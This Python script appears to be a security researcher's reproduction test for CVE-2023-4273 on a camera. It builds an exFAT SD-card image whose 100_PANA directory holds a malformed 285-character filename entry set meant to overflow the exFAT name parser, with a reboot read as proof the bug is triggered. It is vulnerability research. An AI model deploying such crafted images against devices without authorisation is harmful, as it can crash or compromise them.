#!/usr/bin/env python3
"""第二轮③：CVE-2023-4273 复现卡 — 照片形态长名条目集放进 100_PANA（回放照片列表必经）

背景：①②（根目录/DCIM 内长名）相机均 M。可能原因：a) 相机从不 readdir 那些位置；
      b) 非相册条目被软件跳过；c) C0 哈希与全名不符被拒（①② 哈希只算 12 字符）。
      ③ 消除全部混淆：条目放进 100_PANA（簇41，回放必列照片）、名字像照片
      （P1000001.JPG+273A）、C0.NL=255、哈希=全 285 字符哈希、85 次项数=20。
判读：R（开机或进回放瞬间重启）= CVE 触发确认；M=相机解析有界/已修 → CVE 不可达。
"""
import os, struct, hashlib

REF = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(REF), "images_cam")

PART = 32768
VOL_LEN = 250531840
HEAP_OFF = 32768
FAT_OFF, FAT_LEN = 16384, 16384
SPC = 256
CLUS = SPC * 512
TOTAL_SECT = PART + VOL_LEN

def ror16(x): return ((x >> 1) | ((x & 1) << 15)) & 0xFFFF
def name_hash(name):
    s = 0
    for b in name.encode('utf-16-le'):
        s = (ror16(s) + b) & 0xFFFF
    return s

def fat_dt(y, mo, d, h, mi, s):
    date = ((y - 1980) << 9) | (mo << 5) | d
    time = (h << 11) | (mi << 5) | (s // 2)
    return struct.pack('<I', (date << 16) | time)

def entry85(x, dt, sec):
    return (b'\x85' + bytes([sec]) + struct.pack('<I', x) + b'\x00' * 6
            + dt + dt + dt + b'\x64\x64' + b'\x00' * 6)

def entry_c0(nl, hsh, vdl, fc, dl, flags=0x01):
    return (b'\xc0' + bytes([flags, 0x00, nl]) + struct.pack('<H', hsh)
            + b'\x00\x00' + struct.pack('<Q', vdl) + b'\x00' * 4
            + struct.pack('<I', fc) + struct.pack('<Q', dl))

def entry_c1(name):
    return b'\xc1\x00' + name.encode('utf-16-le') + b'\x00' * (30 - 2 * len(name))

# ---------- 读取相机真机字节 ----------
head = open(os.path.join(REF, "camera_head_4m.bin"), 'rb').read()
part = open(os.path.join(REF, "camera_part16m.bin"), 'rb').read()
heap = open(os.path.join(REF, "camera_heap1m.bin"), 'rb').read()
assert part[:11] == b'\xeb\x76\x90EXFAT   ', "camera_part16m.bin 不对"
root_cam = heap[256 * 1024:384 * 1024]
upcase = heap[128 * 1024:256 * 1024]
dcim_cam = heap[393216:524288]
priv_cam = heap[524288:655360]

TEST = (b"S1M2-CAM-TEMPLATE-TESTFILE " * 1792).ljust(65536, b'#')

# ---------- 根目录 / DCIM：与 seed 完全一致 ----------
dt = fat_dt(2026, 10, 11, 16, 35, 34)
root = bytearray(root_cam[:288])
root += entry85(0x00204DCD, dt, sec=2)
root += entry_c0(12, name_hash("TESTFILE.BIN"), len(TEST), 10, len(TEST))
root += entry_c1("TESTFILE.BIN")

# ---------- 100_PANA（簇41）：写入照片形态长名条目集（唯一改动点） ----------
N_C1 = 19
LONG = "P1000001.JPG" + "A" * (15 * N_C1 - len("P1000001.JPG"))
assert len(LONG) == 15 * N_C1 == 285
p100 = bytearray()
p100 += entry85(0x00204DCD, dt, sec=1 + N_C1)
p100 += entry_c0(255, name_hash(LONG), len(TEST), 10, len(TEST))
for i in range(N_C1):
    p100 += entry_c1(LONG[15 * i:15 * (i + 1)])
assert len(p100) == 32 * (2 + N_C1)

# ---------- 位图 / FAT：与 seed 完全一致（41 已在位图/FAT 中） ----------
alloc = set(range(2, 11)) | {41}
bitmap = bytearray(CLUS)
for c in alloc:
    bitmap[(c - 2) // 8] |= 1 << ((c - 2) % 8)
fat = bytearray(FAT_LEN * 512)
struct.pack_into('<I', fat, 0, 0x0FFFFFF8)
for c in list(range(1, 11)) + [41]:
    struct.pack_into('<I', fat, c * 4, 0xFFFFFFFF)

p = bytearray()
def put(data, sector):
    global p
    off = sector * 512
    if len(p) < off + len(data):
        p += b'\x00' * (off + len(data) - len(p))
    p[off:off + len(data)] = data

put(part[:24 * 512], 0)
put(bytes(fat), FAT_OFF)
put(bytes(bitmap), HEAP_OFF + (2 - 2) * SPC)
put(upcase, HEAP_OFF + (3 - 2) * SPC)
put(bytes(root), HEAP_OFF + (4 - 2) * SPC)
put(dcim_cam, HEAP_OFF + (5 - 2) * SPC)
put(priv_cam, HEAP_OFF + (6 - 2) * SPC)
put(TEST, HEAP_OFF + (10 - 2) * SPC)
put(bytes(p100), HEAP_OFF + (41 - 2) * SPC)

name = "cam_cve4273_p100pana_longname.img"
path = os.path.join(OUT, name)
with open(path, 'wb') as f:
    f.write(head[:512])
    f.seek(PART * 512)
    f.write(bytes(p))
    f.seek(TOTAL_SECT * 512 - 1)
    f.write(b'\x00')
print(f"{name}  written  ({os.path.getsize(path)} 字节稀疏)")

# ---------- 自检 ----------
p100_off = HEAP_OFF * 512 + (41 - 2) * SPC * 512
root_off = HEAP_OFF * 512 + (4 - 2) * SPC * 512
with open(path, 'rb') as f:
    f.seek(PART * 512 + p100_off)
    d = f.read(32 * (2 + N_C1))
    f.seek(PART * 512 + root_off)
    r = f.read(288 + 96)
assert d[0] == 0x85 and d[1] == 1 + N_C1, f"85 次项数错: {d[1]}"
assert d[32] == 0xC0 and d[35] == 255, f"C0 NL 错: {d[35]}"
assert struct.unpack('<H', d[36:38])[0] == name_hash(LONG), "C0 哈希应=全名哈希"
name_bytes = b''.join(bytes(d[32 * (2 + i) + 2:32 * (3 + i)]) for i in range(N_C1))
assert name_bytes == LONG.encode('utf-16-le'), "名字回读不一致"
assert r == bytes(root), "根目录应与 seed 一致"
assert p100_off + len(d) < 40 << 20, "簇41 必须在前 40MB 刷写区内"
print(f"自检 OK: 100_PANA(簇41) = 85(sec=20)+C0(NL=255,hash=全名)+19×C1（{len(LONG)} 字符）")

h = hashlib.sha256()
with open(path, 'rb') as f:
    while f.tell() < (40 << 20):
        h.update(f.read(1 << 20))
print(f"sha256(前40MB) = {h.hexdigest()}")
